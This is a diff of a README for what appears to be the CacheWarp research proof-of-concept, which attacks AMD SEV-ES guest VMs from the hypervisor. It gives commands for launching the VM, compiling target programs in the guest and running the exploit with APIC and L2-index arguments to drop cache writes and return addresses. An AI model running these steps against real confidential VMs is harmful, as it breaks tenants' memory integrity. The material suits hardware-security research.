@@ -8,8 +8,7 @@ While the first one can be run safely, the other two could lead to crash sometim
 ```bash
 # hv> stands for command executed on the hypervisor; vm> stands for command executed on the guest VM 
 # Launch VM (pinned to core 7)
-hv> cd AMDSEV
-hv> sudo taskset -c 7 ./launch-qemu.sh -hda ./focal.qcow2 -cdrom ./ubuntu-20.04.5-desktop-amd64.iso -vnc 1 -console serial -sev-es
+hv> sudo taskset -c 7 ./launch-qemu.sh ...
 
 # Login using the password 'ubuntu'
 vm> sudo su
@@ -26,14 +25,10 @@ vm> gcc generic-writes-drop.c -O2 -o generic-writes-drop
 vm> ./generic-writes-drop 0
 
 # Before it ends, run exploit in another terminal
-sudo ./blind <APIC Interval> <Number of non-zero steps> <L2 target index>
+sudo ./cachewarp_blind_drop <APIC Interval> <Number of non-zero steps> <L2 target index>
 ```
 
-If it takes too long or you think the APIC_Interval is too small which only leads to zero-steps, you can just break it via `ctrl+c` and clean up the shared page (the one for synchronization) by `sudo ./blind <> <> <> 1` .
-
-If the L2 sets index is within 1~1024 then the single specified L2 set will be dropped.
-
-Otherwise you can use 0xAAABBB for <L2 target index> to drop L2 sets whose index are within 0xAAA ~ 0xBBB
+If it takes too long or you think the APIC_Interval is too small which only leads to zero-steps, you can just break it via `ctrl+c` and clean up the shared page (the one for synchronization) by `sudo ./cachewarp_blind_drop <> <> <> 1` .
 
 Note that, if given a wrong index, we will not see the drops. 
 Because the target will be already evicted from the cache to memory. 
@@ -50,13 +45,11 @@ result: 39999998815 (similar, i.e., not 40000000000)
 
 ### 2. Drop stack memory
 
-Set `UC_VMSA` to 0 in `cachewarp.c` for blind drops.
-
 ```bash
-vm> gcc math.c -o math
+vm> gcc dropforge.c -o dropforge
 
 # Run
-vm> ./math
+vm> ./dropforge
 
 # Run the exploit in another terminal
 # This time we iteratively drop each index
@@ -68,8 +61,6 @@ hv> sudo ./invd.sh
 
 
 ### 3. Reuse return value 
-
-Set `UC_VMSA` to 0 in `cachewarp.c` for blind drops.
 
 (Drop return address of the `call` instruction) 
 
